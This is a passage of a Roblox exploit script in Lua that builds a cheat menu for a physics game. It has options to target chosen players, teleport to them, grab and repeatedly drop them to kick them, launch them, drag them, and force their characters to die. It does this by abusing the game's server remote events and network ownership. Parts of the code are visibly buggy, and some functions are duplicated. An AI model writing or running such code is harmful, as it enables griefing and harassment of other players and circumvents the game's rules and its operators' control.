    PremiumOnly = false
})
BlobmanTab:AddSection({
    Name = "Blobman Target"
})
local blobmanConfig = {
    Players = game:GetService("Players"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    Workspace = game:GetService("Workspace"),
    LocalPlayer = nil,
    TargetList = MovementConfig.TargetList or {},
    selectedPlayer = nil,
    toggleEnabled = false,
    teleportAllEnabled = false,
    teleportDelay = 1,
    currentBlobman = nil,
    masterRunning = false,
    blobalter = 1,
    ORIGIN_POS = nil,
    MAX_TELEPORT_DIST = 500,
    targetPlayerDropdown = nil
}
blobmanConfig.LocalPlayer = blobmanConfig.Players.LocalPlayer
MovementConfig.TargetList = blobmanConfig.TargetList
function getAllPlayers()
    local iter, tbl, idx = ipairs(blobmanConfig.Players:GetPlayers())
    local result = {}
    while true do
        local player
        idx, player = iter(tbl, idx)
        if idx == nil then
            break
        end
        if player ~= blobmanConfig.LocalPlayer then
            table.insert(result, player.Name)
        end
    end
    return result
end
function refreshDropdown()
    if blobmanConfig.targetPlayerDropdown then
        blobmanConfig.targetPlayerDropdown:Refresh(getAllPlayers(), true)
    end
end
blobmanConfig.targetPlayerDropdown = BlobmanTab:AddDropdown({
    Name = "Select Player",
    Default = "",
    Options = getAllPlayers(),
    Callback = function(name)
        blobmanConfig.selectedPlayer = blobmanConfig.Players:FindFirstChild(name)
    end
})
registerDropdown(blobmanConfig.targetPlayerDropdown)
BlobmanTab:AddButton({
    Name = "Add Selected Player to Target List",
    Callback = function()
        if blobmanConfig.selectedPlayer and not blobmanConfig.TargetList[blobmanConfig.selectedPlayer.UserId] then
            blobmanConfig.TargetList[blobmanConfig.selectedPlayer.UserId] = blobmanConfig.selectedPlayer.Name
            OrionLib:MakeNotification({
                Name = "Player Added",
                Content = blobmanConfig.selectedPlayer.Name .. " added to target list.",
                Time = 2
            })
        end
    end
})
BlobmanTab:AddButton({
    Name = "Remove Selected Player from Target List",
    Callback = function()
        if blobmanConfig.selectedPlayer and blobmanConfig.TargetList[blobmanConfig.selectedPlayer.UserId] then
            blobmanConfig.TargetList[blobmanConfig.selectedPlayer.UserId] = nil
            OrionLib:MakeNotification({
                Name = "Player Removed",
                Content = blobmanConfig.selectedPlayer.Name .. " removed from target list.",
                Time = 2
            })
        end
    end
})
function blobGrabPlayer(player, blobman)
    if grabAlternator ~= 1 then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local args = {
                blobman:FindFirstChild("RightDetector"),
                player.Character:FindFirstChild("HumanoidRootPart"),
                blobman:FindFirstChild("RightDetector"):FindFirstChild("RightWeld")
            }
            blobman:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(args))
            grabAlternator = 1
        end
    elseif player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local args = {
            blobman:FindFirstChild("LeftDetector"),
            player.Character:FindFirstChild("HumanoidRootPart"),
            blobman:FindFirstChild("LeftDetector"):FindFirstChild("LeftWeld")
        }
        blobman:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(args))
        grabAlternator = 2
    end
end
function getMountedBlobman()
    local char = LocalPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum and (hum.SeatPart and hum.SeatPart.Parent.Name == "CreatureBlobman") then
            return hum.SeatPart.Parent
        end
    end
    return nil
end
function teleportBlobman(blobman, position)
    local char = LocalPlayer.Character
    if char then
        char = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    end
    if char then
        local bodyPos = Instance.new("BodyPosition")
        bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bodyPos.P = 100000
        bodyPos.Position = position
        bodyPos.Parent = blobman.PrimaryPart
        char.CFrame = CFrame.new(position)
        blobman:SetPrimaryPartCFrame(CFrame.new(position))
        task.wait(0.1)
        bodyPos:Destroy()
    end
end
function startGrabbingPlayers()
    task.spawn(function()
        while true do
            if not antiBlobmanEnabled then
                return
            end
            local iter, tbl, idx = pairs(Workspace:GetDescendants())
            local foundBlob = nil
            while true do
                local desc
                idx, desc = iter(tbl, idx)
                if idx == nil then
                    desc = foundBlob
                end
                if desc.Name == "CreatureBlobman" and desc:FindFirstChild("VehicleSeat") and (desc.VehicleSeat:FindFirstChild("SeatWeld") and desc.VehicleSeat.SeatWeld.Part1:IsDescendantOf(AttackLocalPlayerRef.Character)) then
                    break
                end
            end
            if not desc then
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "You must be mounted on a Blobman!",
                    Time = 5
                })
                antiBlobmanEnabled = false
                return
            end
            local iter2, tbl2, idx2 = pairs(MovementConfig.TargetList)
            while true do
                local userId
                idx2, userId = iter2(tbl2, idx2)
                if idx2 == nil then
                    break
                end
                local player = Players:GetPlayerByUserId(userId)
                if player then
                    blobGrabPlayer(player, desc)
                    task.wait(MovementConfig.BlobmanDelay or 0.1)
                end
            end
            task.wait(0.02)
        end
    end)
end
function attemptTeleportAndGrab(player, blobman, origin, dist)
    local maxDist = dist or 20
    local char = LocalPlayer.Character
    if char then
        char = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    end
    if not (char and player.Character and player.Character:FindFirstChild("HumanoidRootPart")) then
        return false
    end
    local targetRoot = player.Character.HumanoidRootPart
    if (targetRoot.Position - origin).Magnitude <= maxDist then
        return true
    end
    local targetPos = targetRoot.Position + Vector3.new(0, 2, 0)
    teleportBlobman(blobman, targetPos)
    task.wait(0.2)
    blobGrabPlayer(player, blobman)
    task.wait(0.2)
    teleportBlobman(blobman, origin)
    task.wait(0.2)
    return (targetRoot.Position - origin).Magnitude <= maxDist
end
function startTeleportingPlayers()
    task.spawn(function()
        while antiBlobmanEnabled do
            local blobman = getMountedBlobman()
            local char = LocalPlayer.Character
            if char then
                char = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            end
            if blobman and char then
                local myPos = char.Position
                local iter, tbl, idx = pairs(MovementConfig.TargetList)
                while true do
                    local userId
                    idx, userId = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    local player = Players:GetPlayerByUserId(idx)
                    if player and player.Character and (player.Character:FindFirstChild("HumanoidRootPart") and (player.Character.HumanoidRootPart.Position - myPos).Magnitude > 20) then
                        local success = false
                        local attempts = 0
                        while antiBlobmanEnabled and (not success and attempts < 3) do
                            success = attemptTeleportAndGrab(player, blobman, myPos)
                            attempts = attempts + 1
                            if not success then
                                task.wait(0.5)
                            end
                        end
                    end
                end
            end
            task.wait(0.2)
        end
    end)
end
BlobmanTab:AddToggle({
    Name = "Blobman Target (If you are in safe zone/void)",
    Default = false,
    Callback = function(val)
        antiBlobmanEnabled = val
        if val then
            startGrabbingPlayers()
            startTeleportingPlayers()
        end
    end
})
function findGroundBelow(position)
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {
        blobmanConfig.LocalPlayer.Character
    }
    params.FilterType = Enum.RaycastFilterType.Blacklist
    local result = blobmanConfig.Workspace:Raycast(position + Vector3.new(0, 50, 0), Vector3.new(0, -400), params)
    if result then
        position = result.Position or position
    end
    return position
end
function spawnBlobman()
    local char = blobmanConfig.LocalPlayer.Character
    if char then
        char = blobmanConfig.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    end
    if not char then
        return nil
    end
    local ground = findGroundBelow(char.Position)
    local spawnCF = CFrame.new(ground + Vector3.new(0, 3, 0))
    pcall(function()
        blobmanConfig.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", spawnCF, Vector3.new(0, 59.667, 0))
    end)
    local toyFolder = blobmanConfig.LocalPlayer.Name .. "SpawnedInToys"
    for _ = 1, 30 do
        local folder = blobmanConfig.Workspace:FindFirstChild(toyFolder)
        local blob = folder and folder:FindFirstChild("CreatureBlobman")
        if blob then
            blobmanConfig.blobalter = 1
            return blob
        end
        task.wait(0.15)
    end
    return nil
end
function findExistingBlobman()
    local folder = blobmanConfig.Workspace:FindFirstChild(blobmanConfig.LocalPlayer.Name .. "SpawnedInToys")
    return folder and folder:FindFirstChild("CreatureBlobman") or nil
end
function getMountedBlobman()
    local char = blobmanConfig.LocalPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum and (hum.SeatPart and (hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman")) then
            return hum.SeatPart.Parent
        else
            return nil
        end
    else
        return nil
    end
end
function seatOnBlobman(blobman)
    if blobman and blobmanConfig.LocalPlayer.Character then
        local char = blobmanConfig.LocalPlayer.Character
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        local rootPart = char:FindFirstChild("HumanoidRootPart")
        if humanoid and rootPart then
            local seat = blobman:FindFirstChild("VehicleSeat")
            if seat and seat:IsA("VehicleSeat") then
                rootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
                pcall(function()
                    seat:Sit(humanoid)
                end)
                task.wait(0.25)
            end
        end
    else
        return
    end
end
function teleportBlobman(blobman, position)
    if blobman and blobman.PrimaryPart then
        local char = blobmanConfig.LocalPlayer.Character
        if char then
            local rootPart = char:FindFirstChild("HumanoidRootPart")
            if rootPart then
                local bodyPos = Instance.new("BodyPosition")
                bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bodyPos.P = 100000
                bodyPos.Position = position
                bodyPos.Parent = blobman.PrimaryPart
                pcall(function()
                    rootPart.CFrame = CFrame.new(position)
                    blobman:SetPrimaryPartCFrame(CFrame.new(position))
                end)
                task.wait(0.1)
                if bodyPos and bodyPos.Parent then
                    bodyPos:Destroy()
                end
            end
        else
            return
        end
    else
        return
    end
end
function blobGrabPlayer(player, blobman)
    if player and blobman then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local leftDetector = blobman:FindFirstChild("LeftDetector")
            local rightDetector = blobman:FindFirstChild("RightDetector")
            local seatScript = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
            if seatScript then
                local grabRemote = seatScript:FindFirstChild("CreatureGrab")
                if grabRemote then
                    if blobmanConfig.blobalter ~= 1 then
                        local rightWeld
                        if rightDetector then
                            rightWeld = rightDetector:FindFirstChild("RightWeld")
                        else
                            rightWeld = rightDetector
                        end
                        if rightDetector and rightWeld then
                            pcall(function()
                                grabRemote:FireServer(rightDetector, player.Character.HumanoidRootPart, rightWeld)
                            end)
                            blobmanConfig.blobalter = 1
                        end
                    else
                        local leftWeld
                        if leftDetector then
                            leftWeld = leftDetector:FindFirstChild("LeftWeld")
                        else
                            leftWeld = leftDetector
                        end
                        if leftDetector and leftWeld then
                            pcall(function()
                                grabRemote:FireServer(leftDetector, player.Character.HumanoidRootPart, leftWeld)
                            end)
                            blobmanConfig.blobalter = 2
                        end
                    end
                end
            else
                return
            end
        else
            return
        end
    else
        return
    end
end
function attemptTeleportAndGrab(player, blobman, origin, maxDist)
    local dist = maxDist or 20
    if player and (blobman and origin) then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local targetRoot = player.Character.HumanoidRootPart
            local magnitude = (targetRoot.Position - origin).Magnitude
            if blobmanConfig.ORIGIN_POS and (targetRoot.Position - blobmanConfig.ORIGIN_POS).Magnitude > blobmanConfig.MAX_TELEPORT_DIST then
                return false
            elseif magnitude <= dist then
                blobGrabPlayer(player, blobman)
                task.wait(0.1)
                return true
            else
                local targetPos = targetRoot.Position + Vector3.new(0, 2, 0)
                teleportBlobman(blobman, targetPos)
                task.wait(0.2)
                blobGrabPlayer(player, blobman)
                task.wait(0.2)
                teleportBlobman(blobman, origin)
                task.wait(0.2)
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    return (player.Character.HumanoidRootPart.Position - origin).Magnitude <= dist
                else
                    return false
                end
            end
        else
            return false
        end
    else
        return false
    end
end
function blobDropAndRegrabCycle(player, blobman, originPos)
    if not (player and (player.Character and (blobman and blobman.Parent))) then
        return
    end
    local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
    if not targetRoot then
        return
    end
    local seatScript = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
    if not seatScript then
        return
    end
    local dropRemote = seatScript:FindFirstChild("CreatureDrop")
    if not (dropRemote and seatScript:FindFirstChild("CreatureGrab")) then
        return
    end
    for i = 1, 4 do
        if not blobmanConfig.toggleEnabled then
            break
        end
        local height = (originPos or blobmanConfig.LocalPlayer.Character and (blobmanConfig.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and blobmanConfig.LocalPlayer.Character.HumanoidRootPart.Position) or Vector3.new()) + Vector3.new(0, 10 * i, 0)
        if blobman and blobman.PrimaryPart then
            teleportBlobman(blobman, height)
        end
        task.wait(0.1)
        local leftDetector = blobman:FindFirstChild("LeftDetector")
        local rightDetector = blobman:FindFirstChild("RightDetector")
        if leftDetector then
            leftDetector = leftDetector:FindFirstChild("RigidConstraint") or leftDetector:FindFirstChild("LeftWeld")
        end
        if rightDetector then
            rightDetector = rightDetector:FindFirstChild("RightWeld") or rightDetector:FindFirstChild("RigidConstraint")
        end
        if leftDetector then
            pcall(function()
                dropRemote:FireServer(leftDetector, targetRoot)
            end)
        end
        if rightDetector then
            pcall(function()
                dropRemote:FireServer(rightDetector, targetRoot)
            end)
        end
        task.wait(0.1)
        blobGrabPlayer(player, blobman)
        task.wait(0.1)
    end
end
function masterLoop()
    if not blobmanConfig.masterRunning then
        blobmanConfig.masterRunning = true
        local char = blobmanConfig.LocalPlayer.Character
        if char then
            char = char:FindFirstChild("HumanoidRootPart")
        end
        if char then
            blobmanConfig.ORIGIN_POS = char.Position
        end
        MovementConfig.LastProcessed = MovementConfig.LastProcessed or {}
        task.spawn(function()
            while true do
                if true then
                    if not blobmanConfig.toggleEnabled then
                        blobmanConfig.masterRunning = false
                        return
                    end
                    if not blobmanConfig.currentBlobman or blobmanConfig.currentBlobman and not blobmanConfig.currentBlobman.Parent then
                        blobmanConfig.currentBlobman = findExistingBlobman()
                    end
                    local newBlob = ((not blobmanConfig.currentBlobman or blobmanConfig.currentBlobman and not blobmanConfig.currentBlobman.Parent) and true or false) and spawnBlobman()
                    if newBlob then
                        blobmanConfig.currentBlobman = newBlob
                        task.wait(0.25)
                    end
                    if not (blobmanConfig.currentBlobman and blobmanConfig.currentBlobman.Parent) then
                    end
                end
                local mounted = getMountedBlobman()
                if not mounted or mounted ~= blobmanConfig.currentBlobman then
                    local startTime = os.clock()
                    while blobmanConfig.toggleEnabled and (not mounted or mounted ~= blobmanConfig.currentBlobman) do
                        seatOnBlobman(blobmanConfig.currentBlobman)
                        task.wait(0.25)
                        mounted = getMountedBlobman()
                        if mounted == blobmanConfig.currentBlobman then
                            break
                        end
                        if os.clock() - startTime >= 5 then
                            local respawned = spawnBlobman()
                            if not respawned then
                                break
                            end
                            blobmanConfig.currentBlobman = respawned
                            task.wait(0.3)
                            for _ = 1, 6 do
                                if not blobmanConfig.toggleEnabled then
                                    break
                                end
                                seatOnBlobman(blobmanConfig.currentBlobman)
                                task.wait(0.25)
                                if getMountedBlobman() == blobmanConfig.currentBlobman then
                                    break
                                end
                            end
                        end
                    end
                end
                if getMountedBlobman() == blobmanConfig.currentBlobman then
                    local char = blobmanConfig.LocalPlayer.Character
                    if char then
                        char = char:FindFirstChild("HumanoidRootPart")
                    end
                    if char then
                        local myPos = char.Position
                        local targets = {}
                        if blobmanConfig.teleportAllEnabled then
                            local iter, tbl, idx = ipairs(blobmanConfig.Players:GetPlayers())
                            while true do
                                local player
                                idx, player = iter(tbl, idx)
                                if idx == nil then
                                    break
                                end
                                if player ~= blobmanConfig.LocalPlayer then
                                    table.insert(targets, player)
                                end
                            end
                        else
                            local iter, tbl, idx = pairs(blobmanConfig.TargetList)
                            while true do
                                local userId
                                idx, userId = iter(tbl, idx)
                                if idx == nil then
                                    break
                                end
                                local player = blobmanConfig.Players:GetPlayerByUserId(idx)
                                if player then
                                    table.insert(targets, player)
                                end
                            end
                        end
                        local iter, tbl, idx = ipairs(targets)
                        while true do
                            local player
                            idx, player = iter(tbl, idx)
                            if idx == nil or not blobmanConfig.toggleEnabled then
                                break
                            end
                            if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                if MovementConfig.LastProcessed[player.UserId] then
                                    local rootPart = player.Character
                                    if rootPart then
                                        rootPart = player.Character:FindFirstChild("HumanoidRootPart")
                                    end
                                    local hum = player.Character
                                    if hum then
                                        hum = player.Character:FindFirstChild("Humanoid")
                                    end
                                    if not rootPart or (not hum or (hum.Health <= 0 or (rootPart.Position - myPos).Magnitude > 20)) then
                                        MovementConfig.LastProcessed[player.UserId] = nil
                                    end
                                end
                                if blobmanConfig.ORIGIN_POS and (player.Character.HumanoidRootPart.Position - blobmanConfig.ORIGIN_POS).Magnitude <= blobmanConfig.MAX_TELEPORT_DIST then
                                    if (player.Character.HumanoidRootPart.Position - myPos).Magnitude <= 20 then
                                        blobGrabPlayer(player, blobmanConfig.currentBlobman)
                                        task.wait(MovementConfig.BlobmanDelay or 0.1)
                                        pcall(function()
                                            blobDropAndRegrabCycle(player, blobmanConfig.currentBlobman, myPos)
                                        end)
                                        MovementConfig.LastProcessed[player.UserId] = tick()
                                    else
                                        local success = false
                                        local attempts = 0
                                        while blobmanConfig.toggleEnabled and (not success and (attempts < 3 and (blobmanConfig.currentBlobman and (blobmanConfig.currentBlobman.Parent and getMountedBlobman() == blobmanConfig.currentBlobman)))) do
                                            success = attemptTeleportAndGrab(player, blobmanConfig.currentBlobman, myPos, 20)
                                            attempts = attempts + 1
                                            if success then
                                                pcall(function()
                                                    blobDropAndRegrabCycle(player, blobmanConfig.currentBlobman, myPos)
                                                end)
                                                MovementConfig.LastProcessed[player.UserId] = tick()
                                            else
                                                task.wait(0.4)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(0.25)
            end
        end)
    end
end
blobmanConfig.LocalPlayer.CharacterAdded:Connect(function()
    if blobmanConfig.toggleEnabled then
        task.wait(1.5)
        local char = blobmanConfig.LocalPlayer.Character
        if char then
            char = char:FindFirstChild("HumanoidRootPart")
        end
        if char then
            blobmanConfig.ORIGIN_POS = char.Position
        end
        masterLoop()
    end
end)
BlobmanTab:AddToggle({
    Name = "Blobman Target (Kick)",
    Default = false,
    Callback = function(val)
        blobmanConfig.toggleEnabled = val
        if val then
            local char = blobmanConfig.LocalPlayer.Character
            if char then
                char = char:FindFirstChild("HumanoidRootPart")
            end
            if char then
                blobmanConfig.ORIGIN_POS = char.Position
            end
            masterLoop()
        end
    end
})
BlobmanTab:AddSlider({
    Name = "Teleport Duration",
    Min = 0.25,
    Max = 3,
    Default = blobmanConfig.teleportDelay,
    Increment = 0.01,
    ValueName = "Seconds",
    Callback = function(val)
        blobmanConfig.teleportDelay = val
    end
})
blobmanConfig.Players.PlayerAdded:Connect(refreshDropdown)
blobmanConfig.Players.PlayerRemoving:Connect(refreshDropdown)
local autoGrabConfig = {
    autoGrab = false,
    autoGrabCoroutine = nil
}
function grabDual(blobman, targetRoot)
    local leftDetector = blobman:FindFirstChild("LeftDetector")
    local rightDetector = blobman:FindFirstChild("RightDetector")
    local seatScript = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
    if leftDetector and (rightDetector and (seatScript and targetRoot)) then
        local leftConstraint = leftDetector:FindFirstChild("RigidConstraint")
        local rightWeld = rightDetector:FindFirstChild("RightWeld")
        if leftConstraint then
            pcall(function()
                seatScript.CreatureGrab:FireServer(leftDetector, targetRoot, leftConstraint)
                seatScript.CreatureDrop:FireServer(leftConstraint, targetRoot)
            end)
        end
        if rightWeld then
            pcall(function()
                seatScript.CreatureGrab:FireServer(rightDetector, targetRoot, rightWeld)
                seatScript.CreatureDrop:FireServer(rightWeld, targetRoot)
            end)
        end
    end
end
function getMyBlobman()
    local iter, tbl, idx = pairs(Workspace:GetDescendants())
    while true do
        local desc
        idx, desc = iter(tbl, idx)
        if idx == nil then
            break
        end
        if desc:IsA("Model") and (desc.Name == "CreatureBlobman" and desc:FindFirstChild("VehicleSeat")) then
            local seatWeld = desc.VehicleSeat:FindFirstChild("SeatWeld")
            if seatWeld and seatWeld.Part1 and seatWeld.Part1:IsDescendantOf(game.Players.LocalPlayer.Character) then
                return desc
            end
        end
    end
    return nil
end
function loopTargetedGrab()
    autoGrabConfig.autoGrabCoroutine = coroutine.create(function()
        local blobman = getMyBlobman()
        if blobman then
            while autoGrabConfig.autoGrab do
                local iter, tbl, idx = pairs(MovementConfig.TargetList)
                while true do
                    local userId
                    idx, userId = iter(tbl, idx)
                    if idx == nil then
                        break
                    end
                    if idx ~= game.Players.LocalPlayer.UserId then
                        local player = game.Players:GetPlayerByUserId(idx)
                        local rootPart = player and player.Character
                        if rootPart then
                            rootPart = player.Character:FindFirstChild("HumanoidRootPart")
                        end
                        if rootPart then
                            grabDual(blobman, rootPart)
                        end
                    end
                end
                task.wait(0.01)
            end
        else
            OrionLib:MakeNotification({
                Name = "No Blobman Found",
                Content = "You must be riding a Blobman to use this.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end)
    coroutine.resume(autoGrabConfig.autoGrabCoroutine)
end
BlobmanTab:AddToggle({
    Name = "God Loop Target",
    Default = false,
    Callback = function(val)
        autoGrabConfig.autoGrab = val
        if val then
            loopTargetedGrab()
        elseif autoGrabConfig.autoGrabCoroutine then
            coroutine.close(autoGrabConfig.autoGrabCoroutine)
            autoGrabConfig.autoGrabCoroutine = nil
        end
    end
})
local hoverConfig = {
    enabled = false,
    coroutine = nil,
    MAX_HOVER_DIST = 500,
    HOVER_HEIGHT = 25
}
function hoverFollowTarget()
    hoverConfig.coroutine = coroutine.create(function()
        while hoverConfig.enabled do
            local blobman = getMountedBlobman()
            local target = blobmanConfig.selectedPlayer
            if blobman and (target and target.Character) and target.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = target.Character.HumanoidRootPart
                local char = blobmanConfig.LocalPlayer.Character
                if char then
                    char = char:FindFirstChild("HumanoidRootPart")
                end
                if char and (char.Position - targetRoot.Position).Magnitude <= hoverConfig.MAX_HOVER_DIST then
                    local hoverPos = targetRoot.Position + Vector3.new(0, hoverConfig.HOVER_HEIGHT, 0)
                    teleportBlobman(blobman, hoverPos)
                end
            end
            task.wait(0.06)
        end
    end)
    coroutine.resume(hoverConfig.coroutine)
end
BlobmanTab:AddToggle({
    Name = "Hover above target",
    Default = false,
    Callback = function(val)
        hoverConfig.enabled = val
        if val then
            hoverFollowTarget()
        elseif hoverConfig.coroutine then
            coroutine.close(hoverConfig.coroutine)
            hoverConfig.coroutine = nil
        end
    end
})
local AurasTab = MainWindow:MakeTab({
    Name = "Auras",
    Icon = "rbxassetid://6031075939",
    PremiumOnly = false
})
AurasTab:AddSection({
    Name = "Auras"
})
local auraConfig = {
    auraCoroutine = nil,
    gravityCoroutine = nil,
    localPlayer = game.Players.LocalPlayer,
    Players = game.Players,
    Debris = game:GetService("Debris"),
    SetNetworkOwner = game.ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
    OrionLib = OrionLib,
    Tab = AurasTab,
    auraRadius = 25
}
function startAirSuspendAura()
    auraConfig.auraCoroutine = coroutine.create(function()
        while true do
            local ok, err = pcall(function()
                local char = auraConfig.localPlayer.Character
                if char and (char:FindFirstChild("Head") and char:FindFirstChild("HumanoidRootPart")) then
                    local _ = char.Head
                    local myRoot = char.HumanoidRootPart
                    local iter, tbl, idx = pairs(auraConfig.Players:GetPlayers())
                    while true do
                        local player
                        idx, player = iter(tbl, idx)
                        if idx == nil then
                            break
                        end
                        coroutine.wrap(function()
                            if player ~= auraConfig.localPlayer and player.Character then
                                local targetChar = player.Character
                                local torso = targetChar:FindFirstChild("Torso")
                                if torso and (torso.Position - myRoot.Position).Magnitude <= auraConfig.auraRadius then
                                    auraConfig.SetNetworkOwner:FireServer(torso, targetChar.HumanoidRootPart.FirePlayerPart.CFrame)
                                    task.wait(0.1)
                                    local velocity = torso:FindFirstChild("l") or Instance.new("BodyVelocity", torso)
                                    velocity.Name = "l"
                                    velocity.Velocity = Vector3.new(0, 200000000000, 0)
                                    velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                    auraConfig.Debris:AddItem(velocity, 100)
                                    task.wait(1)
                                    auraConfig.SetNetworkOwner:FireServer(torso, nil)
                                    if velocity then
                                        velocity:Destroy()
                                    end
                                end
                            end
                        end)()
                    end
                end
            end)
            if not ok then
                warn("Error in Air Suspend Aura: " .. tostring(err))
            end
            task.wait(0.02)
        end
    end)
    coroutine.resume(auraConfig.auraCoroutine)
end
function stopAirSuspendAura()
    if auraConfig.auraCoroutine then
        coroutine.close(auraConfig.auraCoroutine)
        auraConfig.auraCoroutine = nil
    end
end
auraConfig.Tab:AddToggle({
    Name = " Launch Aura",
    Default = false,
    Callback = function(val)
        if val then
            startAirSuspendAura()
        else
            stopAirSuspendAura()
        end
    end
})
auraConfig.localPlayer.CharacterAdded:Connect(function(char)
    auraConfig.playerCharacter = char
end)
function startHellSendAura()
    auraConfig.gravityCoroutine = coroutine.create(function()
        while true do
            local ok, err = pcall(function()
                local char = auraConfig.localPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    local myRoot = char.HumanoidRootPart
                    local camera = Workspace.CurrentCamera
                    local iter, tbl, idx = pairs(auraConfig.Players:GetPlayers())
                    while true do
                        local player
                        idx, player = iter(tbl, idx)
                        if idx == nil then
                            break
                        end
                        if player ~= auraConfig.localPlayer and player.Character then
                            local targetChar = player.Character
                            local torso = targetChar:FindFirstChild("Torso")
                            if torso and (torso.Position - myRoot.Position).Magnitude <= auraConfig.auraRadius then
                                auraConfig.SetNetworkOwner:FireServer(torso, myRoot.CFrame)
                                local iter2, tbl2, idx2 = ipairs(targetChar:GetDescendants())
                                while true do
                                    local desc
                                    idx2, desc = iter2(tbl2, idx2)
                                    if idx2 == nil then
                                        break
                                    end
                                    if desc:IsA("BasePart") then
                                        desc.CanCollide = false
                                    end
                                end
                                local bodyPos = torso:FindFirstChild("HellAuraPos") or Instance.new("BodyPosition")
                                bodyPos.Name = "HellAuraPos"
                                bodyPos.MaxForce = Vector3.new(100000, 100000, 100000)
                                bodyPos.D = 500
                                bodyPos.P = 50000
                                bodyPos.Parent = torso
                                local bodyGyro = torso:FindFirstChild("HellAuraGyro") or Instance.new("BodyGyro")
                                bodyGyro.Name = "HellAuraGyro"
                                bodyGyro.MaxTorque = Vector3.new(100000, 100000, 100000)
                                bodyGyro.D = 500
                                bodyGyro.P = 50000
                                bodyGyro.Parent = torso
                                local lookVec = camera.CFrame.LookVector
                                local upOffset = Vector3.new(0, 5, 0)
                                bodyPos.Position = myRoot.Position + lookVec * 15 + upOffset
                                bodyGyro.CFrame = CFrame.new(torso.Position, myRoot.Position)
                            end
                        end
                    end
                end
            end)
            if not ok then
                warn("Error in Hell Send Aura: " .. tostring(err))
            end
            task.wait(0.05)
        end
    end)
    coroutine.resume(auraConfig.gravityCoroutine)
end
function stopHellSendAura()
    if auraConfig.gravityCoroutine then
        coroutine.close(auraConfig.gravityCoroutine)
        auraConfig.gravityCoroutine = nil
    end
end
auraConfig.Tab:AddToggle({
    Name = "Telekinesis Aura",
    Default = false,
    Callback = function(val)
        if val then
            startHellSendAura()
        else
            stopHellSendAura()
        end
    end
})
function death(val)
    if deathConnection then
        deathConnection:Disconnect()
    end
    if val then
        MovementConfig.Death_Aura = true
        deathConnection = RunService.Heartbeat:Connect(function()
            local plrs = Players
            local iter, tbl, idx = ipairs(plrs:GetPlayers())
            while true do
                local player
                idx, player = iter(tbl, idx)
                if idx == nil then
                    break
                end
                if player ~= LocalPlayer and player.Character then
                    local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                    local targetHead = player.Character:FindFirstChild("Head")
                    local targetHum = player.Character:FindFirstChildOfClass("Humanoid")
                    if targetRoot and (targetHead and (targetHum and (targetHum.Health > 0 and (targetRoot.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 25))) then
                        pcall(function()
                            GrabEvents.SetNetworkOwner:FireServer(targetRoot, targetRoot.CFrame)
                            task.wait(0.1)
                            GrabEvents.DestroyGrabLine:FireServer(targetRoot)
                            if targetHead:FindFirstChild("PartOwner") and targetHead.PartOwner.Value == LocalPlayer.Name then
                                local iter2, tbl2, idx2 = pairs(targetHum.Parent:GetChildren())
                                while true do
                                    local part
                                    idx2, part = iter2(tbl2, idx2)
                                    if idx2 == nil then
                                        break
                                    end
                                    if part:IsA("BasePart") then
                                        part.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                                    end
                                end
                                task.wait()
                                local iter3, tbl3, idx3 = pairs(targetHum.Parent:GetChildren())
                                while true do
                                    local part
                                    idx3, part = iter3(tbl3, idx3)
                                    if idx3 == nil then
                                        break
                                    end
                                    if part:IsA("BasePart") then
                                        part.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                                    end
                                end
                                local deathVelocity = Instance.new("BodyVelocity")
                                deathVelocity.Velocity = Vector3.new(0, -9999999, 0)
                                deathVelocity.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
                                deathVelocity.P = 100000075
                                deathVelocity.Parent = targetRoot
                                targetHum.Sit = false
                                targetHum.Jump = true
                                targetHum.BreakJointsOnDeath = false
                                targetHum:ChangeState(Enum.HumanoidStateType.Dead)
                                task.delay(2, function()
                                    if deathVelocity and deathVelocity.Parent then
                                        deathVelocity:Destroy()
                                    end
                                end)
                            end
                        end)
                    end
                end
            end
        end)
    else
        MovementConfig.Death_Aura = false
    end
end
AurasTab:AddToggle({
    Name = "Death Aura",
    Default = false,
    Callback = death
})
local TeleportTab = MainWindow:MakeTab({
    Name = "Teleport",
    Icon = "rbxassetid://6031068433",
    PremiumOnly = false
})
TeleportTab:AddSection({
    Name = "Teleport"
})
